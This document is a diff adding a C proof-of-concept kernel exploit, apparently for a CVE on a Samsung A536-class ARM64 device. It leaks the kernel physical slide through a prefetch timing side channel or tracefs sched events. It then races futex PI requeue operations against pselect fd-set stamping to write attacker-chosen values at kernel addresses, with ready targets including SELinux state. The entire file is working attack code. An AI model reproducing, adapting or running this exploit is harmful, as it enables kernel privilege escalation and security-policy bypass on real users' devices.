@@ -1,0 +1,851 @@
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/futex.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdatomic.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <time.h>
+#include <unistd.h>
+
+#ifndef TARGET_HEADER
+#define TARGET_HEADER "profiles/a536e-a536exxsngzg3/target.h"
+#endif
+#include TARGET_HEADER
+
+#define NFDS 320
+#define FD_WORDS 5
+#define SCHED_BATCH 3
+#define TRACEFS_ROOT "/sys/kernel/tracing"
+#define PREFETCH_SAMPLES 32
+#define PREFETCH_BURST 512
+#define PREFETCH_SCAN_STEP 0x8000ULL
+#define PREFETCH_SCAN_DEFAULT_MAX MAX_PHYSICAL_SLIDE
+#define PREFETCH_EDGE_RUN 8
+
+static const uint64_t init_task_base = INIT_TASK_BASE;
+static const uint64_t uid_lock_base = UID_LOCK_ALIAS;
+static const uint64_t bootid_target_base = BOOTID_TARGET_BASE;
+static const uint64_t perf_target_base = PERF_TARGET_BASE;
+static const uint64_t selinux_target_base = SELINUX_STATE_ALIAS;
+static uint64_t physical_slide;
+static uint64_t init_task;
+static uint64_t fake_lock;
+
+static uint32_t f_wait;
+static uint32_t f_target;
+static uint32_t f_chain;
+static atomic_int waiter_ready;
+static atomic_int waiter_waiting;
+static atomic_int owner_blocking;
+static atomic_int deadlock_seen;
+static atomic_int stamp_enter;
+static atomic_int consume_done;
+static atomic_int waiter_tid;
+static uint64_t read_set[FD_WORDS];
+static uint64_t write_set[FD_WORDS];
+static uint64_t except_set[FD_WORDS];
+static int log_fd = -1;
+static int pipe_reader = -1;
+static int pipe_writer = -1;
+static pid_t repair_pid = -1;
+static int prefetch_soft_fail;
+
+static _Noreturn void die(const char *where)
+{
+    int error = errno;
+    dprintf(log_fd >= 0 ? log_fd : STDERR_FILENO,
+            "FAIL %s errno=%d %s\n", where, error, strerror(error));
+    _exit(1);
+}
+
+static void spin_until(atomic_int *value)
+{
+    while (!atomic_load_explicit(value, memory_order_acquire))
+        __asm__ volatile("yield");
+}
+
+static _Noreturn void spin_forever(void)
+{
+    for (;;)
+        pause();
+}
+
+static void sleep_ms(long milliseconds)
+{
+    struct timespec delay = {
+        .tv_sec = milliseconds / 1000,
+        .tv_nsec = milliseconds % 1000 * 1000000,
+    };
+
+    if (nanosleep(&delay, NULL))
+        die("nanosleep");
+}
+
+#if defined(__aarch64__)
+static inline uint64_t read_virtual_counter(void)
+{
+    uint64_t value;
+
+    __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb"
+                     : "=r"(value));
+    return value;
+}
+
+static uint64_t measure_prefetch_data(uintptr_t address)
+{
+    __asm__ volatile("dsb sy\n\tisb" ::: "memory");
+    uint64_t started = read_virtual_counter();
+
+    for (int index = 0; index < PREFETCH_BURST; index++)
+        __asm__ volatile("prfm pldl1keep, [%0]" : : "r"(address) : "memory");
+    __asm__ volatile("dsb sy\n\tisb" ::: "memory");
+    return read_virtual_counter() - started;
+}
+
+static uint64_t measure_prefetch_instruction(uintptr_t address)
+{
+    __asm__ volatile("dsb sy\n\tisb" ::: "memory");
+    uint64_t started = read_virtual_counter();
+
+    for (int index = 0; index < PREFETCH_BURST; index++)
+        __asm__ volatile("prfm plil1keep, [%0]" : : "r"(address) : "memory");
+    __asm__ volatile("dsb sy\n\tisb" ::: "memory");
+    return read_virtual_counter() - started;
+}
+
+static uint64_t measure_prefetch(uintptr_t address)
+{
+    const char *kind = getenv("A53_PREFETCH_KIND");
+
+    if (kind && !strcmp(kind, "data"))
+        return measure_prefetch_data(address);
+    return measure_prefetch_instruction(address);
+}
+
+static int compare_u64(const void *left, const void *right)
+{
+    uint64_t a = *(const uint64_t *)left;
+    uint64_t b = *(const uint64_t *)right;
+
+    return (a > b) - (a < b);
+}
+
+static uint64_t prefetch_quantile(uintptr_t address, size_t quantile)
+{
+    uint64_t samples[PREFETCH_SAMPLES];
+
+    for (size_t index = 0; index < PREFETCH_SAMPLES; index++)
+        samples[index] = measure_prefetch(address);
+    qsort(samples, PREFETCH_SAMPLES, sizeof(samples[0]), compare_u64);
+    if (quantile >= PREFETCH_SAMPLES)
+        quantile = PREFETCH_SAMPLES - 1;
+    return samples[quantile];
+}
+
+static void prefetch_triplet(uintptr_t address, uintptr_t mapped,
+                             uintptr_t unmapped, uint64_t *candidate_q10,
+                             uint64_t *mapped_q10, uint64_t *unmapped_q10)
+{
+    uint64_t candidate_samples[PREFETCH_SAMPLES];
+    uint64_t mapped_samples[PREFETCH_SAMPLES];
+    uint64_t unmapped_samples[PREFETCH_SAMPLES];
+
+    for (size_t index = 0; index < PREFETCH_SAMPLES; index++) {
+        candidate_samples[index] = measure_prefetch(address);
+        mapped_samples[index] = measure_prefetch(mapped);
+        unmapped_samples[index] = measure_prefetch(unmapped);
+    }
+    qsort(candidate_samples, PREFETCH_SAMPLES, sizeof(candidate_samples[0]),
+          compare_u64);
+    qsort(mapped_samples, PREFETCH_SAMPLES, sizeof(mapped_samples[0]),
+          compare_u64);
+    qsort(unmapped_samples, PREFETCH_SAMPLES, sizeof(unmapped_samples[0]),
+          compare_u64);
+    *candidate_q10 = candidate_samples[3];
+    *mapped_q10 = mapped_samples[3];
+    *unmapped_q10 = unmapped_samples[3];
+}
+
+static uint64_t parse_prefetch_max(void)
+{
+    const char *value = getenv("A53_PREFETCH_MAX");
+    char *end = NULL;
+    unsigned long long parsed;
+
+    if (!value || !*value)
+        return PREFETCH_SCAN_DEFAULT_MAX;
+    errno = 0;
+    parsed = strtoull(value, &end, 0);
+    if (errno || end == value || *end || parsed > MAX_PHYSICAL_SLIDE ||
+        (parsed & (PREFETCH_SCAN_STEP - 1))) {
+        errno = EINVAL;
+        die("A53_PREFETCH_MAX");
+    }
+    return parsed;
+}
+
+static unsigned parse_prefetch_edge_run(void)
+{
+    const char *value = getenv("A53_PREFETCH_EDGE_RUN");
+    char *end = NULL;
+    unsigned long parsed;
+
+    if (!value || !*value)
+        return PREFETCH_EDGE_RUN;
+    errno = 0;
+    parsed = strtoul(value, &end, 0);
+    if (errno || end == value || *end || parsed < 2 || parsed > 64) {
+        errno = EINVAL;
+        die("A53_PREFETCH_EDGE_RUN");
+    }
+    return (unsigned)parsed;
+}
+
+static unsigned parse_prefetch_repeats(void)
+{
+    const char *value = getenv("A53_PREFETCH_REPEATS");
+    char *end = NULL;
+    unsigned long parsed;
+
+    if (!value || !*value)
+        return 3;
+    errno = 0;
+    parsed = strtoul(value, &end, 0);
+    if (errno || end == value || *end || parsed < 1 || parsed > 9) {
+        errno = EINVAL;
+        die("A53_PREFETCH_REPEATS");
+    }
+    return (unsigned)parsed;
+}
+
+static void pin_prefetch_cpu(void)
+{
+    const char *value = getenv("A53_PREFETCH_CPU");
+    char *end = NULL;
+    unsigned long parsed = 0;
+    cpu_set_t set;
+
+    if (value && *value) {
+        errno = 0;
+        parsed = strtoul(value, &end, 0);
+        if (errno || end == value || *end || parsed >= CPU_SETSIZE) {
+            errno = EINVAL;
+            die("A53_PREFETCH_CPU");
+        }
+    }
+    CPU_ZERO(&set);
+    CPU_SET(parsed, &set);
+    if (sched_setaffinity(0, sizeof(set), &set))
+        die("prefetch affinity");
+    dprintf(log_fd >= 0 ? log_fd : STDERR_FILENO,
+            "prefetch cpu=%d requested=%lu\n", sched_getcpu(), parsed);
+}
+
+static uint64_t leak_physical_slide_prefetch(void)
+{
+    unsigned char *unmapped;
+    uintptr_t mapped_address;
+    uintptr_t unmapped_address;
+    uint64_t mapped_q10;
+    uint64_t unmapped_q10;
+    uint64_t kernel_mapped_q10;
+    uint64_t kernel_unmapped_q10;
+    uint64_t edge_threshold;
+    uint64_t scan_max = parse_prefetch_max();
+    uint64_t edge_offset = UINT64_MAX;
+    unsigned edge_run = parse_prefetch_edge_run();
+    unsigned high_run = 0;
+    unsigned low_run = 0;
+
+    mapped_address = (uintptr_t)&measure_prefetch_instruction;
+    unmapped = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
+                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (unmapped == MAP_FAILED)
+        die("prefetch mmap");
+    unmapped_address = (uintptr_t)unmapped;
+    if (munmap(unmapped, 4096))
+        die("prefetch munmap");
+
+    mapped_q10 = prefetch_quantile(mapped_address, 3);
+    unmapped_q10 = prefetch_quantile(unmapped_address, 3);
+    kernel_mapped_q10 = prefetch_quantile(PAGE_OFFSET + 0x1000000ULL, 3);
+    kernel_unmapped_q10 = prefetch_quantile(PAGE_OFFSET + 0x80000000ULL, 3);
+    dprintf(log_fd >= 0 ? log_fd : STDERR_FILENO,
+            "prefetch kernel-control mapped=%llu unmapped=%llu mapped_addr=%#llx unmapped_addr=%#llx\n",
+            (unsigned long long)kernel_mapped_q10,
+            (unsigned long long)kernel_unmapped_q10,
+            (unsigned long long)(PAGE_OFFSET + 0x1000000ULL),
+            (unsigned long long)(PAGE_OFFSET + 0x80000000ULL));
+    if (unmapped_q10 <= mapped_q10 ||
+        unmapped_q10 - mapped_q10 < 8 ||
+        unmapped_q10 - mapped_q10 < mapped_q10 / 2) {
+        if (prefetch_soft_fail)
+            return UINT64_MAX;
+        errno = ENODATA;
+        die("prefetch controls");
+    }
+    edge_threshold = mapped_q10 + (unmapped_q10 - mapped_q10) / 2;
+    dprintf(log_fd >= 0 ? log_fd : STDERR_FILENO,
+            "prefetch control mapped=%llu unmapped=%llu threshold=%llu max=%#llx step=%#llx\n",
+            (unsigned long long)mapped_q10,
+            (unsigned long long)unmapped_q10,
+            (unsigned long long)edge_threshold,
+            (unsigned long long)scan_max,
+            (unsigned long long)PREFETCH_SCAN_STEP);
+
+    for (uint64_t offset = 0; offset <= scan_max;
+         offset += PREFETCH_SCAN_STEP) {
+        uintptr_t address = (uintptr_t)KIMAGE_TEXT_BASE + offset;
+        uint64_t local_mapped;
+        uint64_t local_unmapped;
+        uint64_t q10;
+        uint64_t local_threshold;
+        uint64_t delta;
+
+        prefetch_triplet(address, mapped_address, unmapped_address, &q10,
+                         &local_mapped, &local_unmapped);
+        if (local_unmapped <= local_mapped ||
+            local_unmapped - local_mapped < 8 ||
+            local_unmapped - local_mapped < local_mapped / 2) {
+            dprintf(log_fd >= 0 ? log_fd : STDERR_FILENO,
+                    "prefetch local-control invalid offset=%#llx mapped=%llu unmapped=%llu\n",
+                    (unsigned long long)offset,
+                    (unsigned long long)local_mapped,
+                    (unsigned long long)local_unmapped);
+            high_run = 0;
+            low_run = 0;
+            continue;
+        }
+        local_threshold = local_mapped +
+                          (local_unmapped - local_mapped) / 2;
+        delta = local_unmapped > q10 ? local_unmapped - q10 : 0;
+
+        dprintf(log_fd >= 0 ? log_fd : STDERR_FILENO,
+                "prefetch candidate offset=%#llx address=%#llx q10=%llu mapped=%llu unmapped=%llu threshold=%llu delta=%llu\n",
+                (unsigned long long)offset,
+                (unsigned long long)address,
+                (unsigned long long)q10,
+                (unsigned long long)local_mapped,
+                (unsigned long long)local_unmapped,
+                (unsigned long long)local_threshold,
+                (unsigned long long)delta);
+        if (q10 > local_threshold) {
+            low_run = 0;
+            high_run = high_run < edge_run ? high_run + 1 : edge_run;
+        } else if (high_run >= edge_run) {
+            if (!low_run)
+                edge_offset = offset;
+            low_run++;
+            if (low_run >= edge_run)
+                break;
+        } else {
+            high_run = 0;
+        }
+        if (offset > scan_max - PREFETCH_SCAN_STEP)
+            break;
+    }
+
+    if (edge_offset == UINT64_MAX) {
+        if (prefetch_soft_fail)
+            return UINT64_MAX;
+        errno = ENODATA;
+        die("prefetch edge");
+    }
+    dprintf(log_fd >= 0 ? log_fd : STDERR_FILENO,
+            "prefetch edge offset=%#llx\n",
+            (unsigned long long)edge_offset);
+    return edge_offset;
+}
+
+static uint64_t leak_physical_slide_prefetch_consensus(void)
+{
+    uint64_t values[9];
+    unsigned repeats = parse_prefetch_repeats();
+    unsigned best_count = 0;
+    unsigned successful = 0;
+    uint64_t best = UINT64_MAX;
+
+    pin_prefetch_cpu();
+
+    for (unsigned index = 0; index < repeats; index++) {
+        prefetch_soft_fail = 1;
+        values[index] = leak_physical_slide_prefetch();
+        prefetch_soft_fail = 0;
+        if (values[index] == UINT64_MAX) {
+            dprintf(log_fd >= 0 ? log_fd : STDERR_FILENO,
+                    "prefetch attempt=%u failed\n", index + 1);
+            continue;
+        }
+        successful++;
+        unsigned count = 0;
+        for (unsigned prior = 0; prior <= index; prior++)
+            if (values[prior] == values[index])
+                count++;
+        if (count > best_count) {
+            best_count = count;
+            best = values[index];
+        }
+    }
+    prefetch_soft_fail = 0;
+    if (successful < (repeats + 1) / 2 || best_count * 2 <= successful) {
+        errno = EAGAIN;
+        die("prefetch consensus");
+    }
+    dprintf(log_fd >= 0 ? log_fd : STDERR_FILENO,
+            "prefetch consensus=%#llx votes=%u/%u\n",
+            (unsigned long long)best, best_count, repeats);
+    return best;
+}
+#else
+static uint64_t leak_physical_slide_prefetch(void)
+{
+    errno = ENOTSUP;
+    die("prefetch aarch64");
+}
+#endif
+
+static void set_abs_timeout(struct timespec *timeout, long milliseconds)
+{
+    if (clock_gettime(CLOCK_MONOTONIC, timeout))
+        die("clock_gettime");
+    timeout->tv_sec += milliseconds / 1000;
+    timeout->tv_nsec += milliseconds % 1000 * 1000000;
+    if (timeout->tv_nsec >= 1000000000) {
+        timeout->tv_sec++;
+        timeout->tv_nsec -= 1000000000;
+    }
+}
+
+static long futex_call(uint32_t *first, int operation, uint32_t value,
+                       uintptr_t timeout_or_count, uint32_t *second,
+                       uint32_t compare)
+{
+    return syscall(SYS_futex, first, operation, value, timeout_or_count,
+                   second, compare);
+}
+
+static void write_text(const char *path, const char *value)
+{
+    int fd = open(path, O_WRONLY | O_CLOEXEC);
+    size_t length = strlen(value);
+
+    if (fd < 0)
+        die(path);
+    if (write(fd, value, length) != (ssize_t)length)
+        die(path);
+    if (close(fd))
+        die(path);
+}
+
+static int parse_trace_page(const unsigned char *page, size_t length,
+                            uint64_t *slide)
+{
+    static int shown;
+    uint64_t commit;
+    size_t end;
+
+    if (length < 20)
+        return 0;
+    memcpy(&commit, page + 8, sizeof(commit));
+    end = 16 + (size_t)(commit & 0xfffULL);
+    if (end > length)
+        end = length;
+
+    for (size_t position = 16; position + 4 <= end;) {
+        uint32_t header;
+        uint32_t type_length;
+        size_t record_length;
+        size_t record;
+        uint16_t event_id;
+        uint64_t caller;
+
+        memcpy(&header, page + position, sizeof(header));
+        type_length = header & 0x1fU;
+        if (type_length == 30) {
+            position += 8;
+            continue;
+        }
+        if (type_length == 31) {
+            position += 12;
+            continue;
+        }
+        if (!type_length || type_length >= 29)
+            break;
+        record_length = (size_t)type_length * 4;
+        record = position + 4;
+        if (record + record_length > end)
+            break;
+        memcpy(&event_id, page + record, sizeof(event_id));
+        if (event_id == TRACE_EVENT_ID && record_length >= 24) {
+            memcpy(&caller, page + record + 16, sizeof(caller));
+            if (shown++ < 12)
+                dprintf(log_fd, "trace caller=%#llx length=%zu\n",
+                        (unsigned long long)caller, record_length);
+            static const uint64_t bases[] = {
+                TRACE_CALLER_WORKER_BASE,
+                TRACE_CALLER_VFORK_BASE,
+            };
+
+            for (size_t index = 0; index < sizeof(bases) / sizeof(bases[0]);
+                 index++) {
+                if (caller >= bases[index]) {
+                    uint64_t candidate = caller - bases[index];
+
+                    if (shown <= 2)
+                        dprintf(log_fd, "candidate[%zu]=%#llx max=%#llx\n",
+                                index, (unsigned long long)candidate,
+                                (unsigned long long)MAX_PHYSICAL_SLIDE);
+
+                    if (candidate <= MAX_PHYSICAL_SLIDE &&
+                        !(candidate & (PHYSICAL_SLIDE_ALIGNMENT - 1))) {
+                        *slide = candidate;
+                        return 1;
+                    }
+                }
+            }
+        }
+        position = record + record_length;
+    }
+    return 0;
+}
+
+static void fill_slide_trace(void)
+{
+    for (int index = 0; index < 96; index++) {
+        int status;
+        pid_t child = vfork();
+
+        if (child < 0)
+            die("vfork");
+        if (!child)
+            _exit(0);
+        if (waitpid(child, &status, 0) != child)
+            die("waitpid");
+    }
+}
+
+static uint64_t leak_physical_slide(void)
+{
+    const char *source = getenv("A53_SLIDE_SOURCE");
+
+    if (!source || !strcmp(source, "prefetch"))
+        return leak_physical_slide_prefetch_consensus();
+    if (strcmp(source, "tracefs")) {
+        errno = EINVAL;
+        die("A53_SLIDE_SOURCE");
+    }
+
+    static const char tracing_on[] = TRACEFS_ROOT "/tracing_on";
+    static const char event_enable[] =
+        TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
+    unsigned char page[4096];
+    uint64_t slide = UINT64_MAX;
+    int trace_fd;
+    int cpu_count;
+
+    write_text(tracing_on, "0");
+    trace_fd = open(TRACEFS_ROOT "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
+    if (trace_fd < 0)
+        die("clear trace");
+    if (close(trace_fd))
+        die("close trace");
+    write_text(event_enable, "1");
+    write_text(tracing_on, "1");
+    fill_slide_trace();
+    sleep_ms(1200);
+    write_text(tracing_on, "0");
+
+    cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+    for (int cpu = 0; cpu < cpu_count && slide == UINT64_MAX; cpu++) {
+        char path[128];
+        ssize_t got;
+
+        snprintf(path, sizeof(path),
+                 TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+        trace_fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+        if (trace_fd < 0)
+            die(path);
+        while ((got = read(trace_fd, page, sizeof(page))) > 0) {
+            if (parse_trace_page(page, (size_t)got, &slide))
+                break;
+        }
+        if (got < 0 && errno != EAGAIN)
+            die(path);
+        if (close(trace_fd))
+            die(path);
+    }
+    write_text(event_enable, "0");
+    if (slide == UINT64_MAX) {
+        errno = ENODATA;
+        die("find trace caller");
+    }
+    return slide;
+}
+
+static void setup_fds(void)
+{
+    int pair[2];
+
+    log_fd = fcntl(STDERR_FILENO, F_DUPFD_CLOEXEC, 500);
+    if (log_fd < 0)
+        die("dup log fd");
+    if (pipe2(pair, O_CLOEXEC))
+        die("pipe2");
+    pipe_reader = pair[0];
+    pipe_writer = fcntl(pair[1], F_DUPFD_CLOEXEC, 400);
+    if (pipe_writer < 0)
+        die("dup pipe writer");
+
+    for (int fd = 0; fd < NFDS; fd++) {
+        if (fd == pipe_reader)
+            continue;
+        if (dup3(pipe_reader, fd, O_CLOEXEC) != fd)
+            die("fill fd table");
+    }
+}
+
+static void setup_stamp(uint64_t target, uint64_t value)
+{
+    memset(read_set, 0, sizeof(read_set));
+    memset(write_set, 0, sizeof(write_set));
+    memset(except_set, 0, sizeof(except_set));
+    write_set[1] = target - 8;
+    write_set[2] = value;
+    except_set[2] = init_task;
+    except_set[3] = fake_lock;
+}
+
+static void *waiter_thread(void *unused)
+{
+    struct timespec timeout;
+    struct timespec before;
+    struct timespec after;
+    long result;
+    int error;
+
+    (void)unused;
+    atomic_store_explicit(&waiter_tid, (int)syscall(SYS_gettid),
+                          memory_order_release);
+    if (futex_call(&f_chain, FUTEX_LOCK_PI, 0, 0, NULL, 0))
+        die("waiter FUTEX_LOCK_PI");
+    atomic_store_explicit(&waiter_ready, 1, memory_order_release);
+    sleep_ms(20);
+    set_abs_timeout(&timeout, 2000);
+    atomic_store_explicit(&waiter_waiting, 1, memory_order_release);
+    errno = 0;
+    result = futex_call(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
+                        (uintptr_t)&timeout, &f_target, 0);
+    error = errno;
+    spin_until(&deadlock_seen);
+    dprintf(log_fd, "wait returned=%ld errno=%d\n", result, error);
+    atomic_store_explicit(&stamp_enter, 1, memory_order_release);
+    timeout.tv_sec = 2;
+    timeout.tv_nsec = 0;
+    if (clock_gettime(CLOCK_MONOTONIC, &before))
+        die("pselect clock before");
+    errno = 0;
+    result = syscall(SYS_pselect6, NFDS, read_set, write_set, except_set,
+                     &timeout, NULL);
+    error = errno;
+    if (clock_gettime(CLOCK_MONOTONIC, &after))
+        die("pselect clock after");
+    dprintf(log_fd, "pselect returned=%ld errno=%d elapsed_ms=%lld\n",
+            result, error,
+            (long long)(after.tv_sec - before.tv_sec) * 1000 +
+            (after.tv_nsec - before.tv_nsec) / 1000000);
+    spin_forever();
+}
+
+static void *owner_thread(void *unused)
+{
+    (void)unused;
+    if (futex_call(&f_target, FUTEX_LOCK_PI, 0, 0, NULL, 0))
+        die("owner FUTEX_LOCK_PI target");
+    spin_until(&waiter_ready);
+    atomic_store_explicit(&owner_blocking, 1, memory_order_release);
+    futex_call(&f_chain, FUTEX_LOCK_PI, 0, 0, NULL, 0);
+    spin_forever();
+}
+
+static void *consumer_thread(void *unused)
+{
+    struct sched_attr attr = {
+        .size = sizeof(attr),
+        .sched_policy = SCHED_BATCH,
+        .sched_nice = 19,
+    };
+    long result;
+    int error;
+
+    (void)unused;
+    spin_until(&stamp_enter);
+    sleep_ms(50);
+    errno = 0;
+    result = syscall(SYS_sched_setattr,
+                     atomic_load_explicit(&waiter_tid, memory_order_acquire),
+                     &attr, 0);
+    error = errno;
+    dprintf(log_fd, "sched_setattr returned=%ld errno=%d\n", result, error);
+    if (repair_pid > 0 && result == 0 &&
+        !getenv("A53_NO_REPAIR_SIGNAL")) {
+        errno = 0;
+        result = kill(repair_pid, SIGUSR1);
+        error = errno;
+        dprintf(log_fd, "repair signal pid=%d returned=%ld errno=%d\n",
+                repair_pid, result, error);
+    } else if (repair_pid > 0) {
+        dprintf(log_fd, "repair signal skipped sched_ret=%ld errno=%d\n",
+                result, error);
+    }
+    atomic_store_explicit(&consume_done, 1, memory_order_release);
+    spin_forever();
+}
+
+static uint64_t parse_target(const char *name)
+{
+    if (!strcmp(name, "bootid"))
+        return bootid_target_base + physical_slide;
+    if (!strcmp(name, "perf"))
+        return perf_target_base + physical_slide;
+    if (!strcmp(name, "selinux"))
+        return selinux_target_base + physical_slide;
+    dprintf(STDERR_FILENO,
+            "use: cve43499-a536 slide|bootid|perf|selinux|raw TARGET LOCK|write TARGET VALUE LOCK [REPAIR_PID]\n");
+    exit(2);
+}
+
+static uint64_t parse_kernel_address(const char *value)
+{
+    char *end;
+    uint64_t address;
+
+    errno = 0;
+    address = strtoull(value, &end, 0);
+    if (errno || *end || address < PAGE_OFFSET ||
+        (address & 7)) {
+        errno = EINVAL;
+        die("kernel address");
+    }
+    return address;
+}
+
+static uint64_t parse_kernel_value(const char *value)
+{
+    char *end;
+    uint64_t address;
+
+    errno = 0;
+    address = strtoull(value, &end, 0);
+    if (errno || *end || (address &&
+        (address < PAGE_OFFSET || (address & 7)))) {
+        errno = EINVAL;
+        die("kernel value");
+    }
+    return address;
+}
+
+static pid_t parse_pid(const char *value)
+{
+    char *end;
+    long parsed;
+
+    errno = 0;
+    parsed = strtol(value, &end, 10);
+    if (errno || *end || parsed <= 1 || parsed > INT32_MAX) {
+        errno = EINVAL;
+        die("repair pid");
+    }
+    return (pid_t)parsed;
+}
+
+static uint64_t get_physical_slide(void)
+{
+    const char *fixed = getenv("A53_SLIDE");
+    char *end;
+    uint64_t value;
+
+    if (!fixed || !*fixed)
+        return leak_physical_slide();
+    errno = 0;
+    value = strtoull(fixed, &end, 0);
+    if (errno || *end || value > MAX_PHYSICAL_SLIDE ||
+        (value & (PHYSICAL_SLIDE_ALIGNMENT - 1))) {
+        errno = EINVAL;
+        die("A53_SLIDE");
+    }
+    return value;
+}
+
+int a536_poc_main(int argc, char **argv)
+{
+    pthread_t waiter;
+    pthread_t owner;
+    pthread_t consumer;
+    uint64_t target;
+    uint64_t value = 0;
+    long result;
+    int error;
+
+    if (argc == 2 && !strcmp(argv[1], "prefetch"))
+        return (leak_physical_slide_prefetch_consensus(), 0);
+    if (argc != 2 && !(argc == 4 && !strcmp(argv[1], "raw")) &&
+        !((argc == 5 || argc == 6) && !strcmp(argv[1], "write")))
+        parse_target("");
+    setup_fds();
+    physical_slide = get_physical_slide();
+    dprintf(log_fd, "physical slide=%#llx\n",
+            (unsigned long long)physical_slide);
+    if (!strcmp(argv[1], "slide"))
+        return 0;
+    init_task = init_task_base + physical_slide;
+    if (!strcmp(argv[1], "raw")) {
+        target = parse_kernel_address(argv[2]);
+        fake_lock = parse_kernel_address(argv[3]);
+    } else if (!strcmp(argv[1], "write")) {
+        target = parse_kernel_address(argv[2]);
+        value = parse_kernel_value(argv[3]);
+        fake_lock = parse_kernel_address(argv[4]);
+        if (argc == 6)
+            repair_pid = parse_pid(argv[5]);
+    } else {
+        target = parse_target(argv[1]);
+        fake_lock = uid_lock_base + physical_slide;
+    }
+    setup_stamp(target, value);
+    dprintf(log_fd,
+            "start mode=%s slide=%#llx target=%#llx value=%#llx lock=%#llx task=%#llx\n",
+            argv[1], (unsigned long long)physical_slide,
+            (unsigned long long)target, (unsigned long long)value,
+            (unsigned long long)fake_lock,
+            (unsigned long long)init_task);
+
+    if (pthread_create(&owner, NULL, owner_thread, NULL))
+        die("pthread owner");
+    if (pthread_create(&consumer, NULL, consumer_thread, NULL))
+        die("pthread consumer");
+    if (pthread_create(&waiter, NULL, waiter_thread, NULL))
+        die("pthread waiter");
+
+    spin_until(&waiter_waiting);
+    spin_until(&owner_blocking);
+    sleep_ms(20);
+    errno = 0;
+    result = futex_call(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, 1,
+                        &f_target, 0);
+    error = errno;
+    dprintf(log_fd, "requeue returned=%ld errno=%d\n", result, error);
+    atomic_store_explicit(&deadlock_seen, 1, memory_order_release);
+    spin_until(&consume_done);
+    dprintf(log_fd, "consume done; keep process live\n");
+    spin_forever();
+}
